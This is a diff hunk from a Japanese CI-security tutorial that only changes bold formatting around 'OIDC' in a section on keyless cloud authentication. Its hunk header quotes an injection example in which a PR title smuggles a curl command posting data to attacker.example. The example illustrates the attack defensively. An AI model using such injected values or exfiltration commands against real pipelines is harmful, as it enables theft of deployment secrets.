@@ -125,7 +125,7 @@ echo "PRのタイトル: a"; curl -X POST https://attacker.example/steal -d "$(p
 
 ## 防御④: OIDCでクラウド認証をキーレスにする
 
-第9章で、デプロイ用トークンをSecretsに入れました。しかしAWSやGCPのような大手クラウドが相手なら、**そもそも長寿命の認証情報を保存しない**方法があります。それが**OIDC（OpenID Connect）**です。
+第9章で、デプロイ用トークンをSecretsに入れました。しかしAWSやGCPのような大手クラウドが相手なら、**そもそも長寿命の認証情報を保存しない**方法があります。それが**OIDC**（OpenID Connect）です。
 
 ### 長寿命キーの何が問題か
 
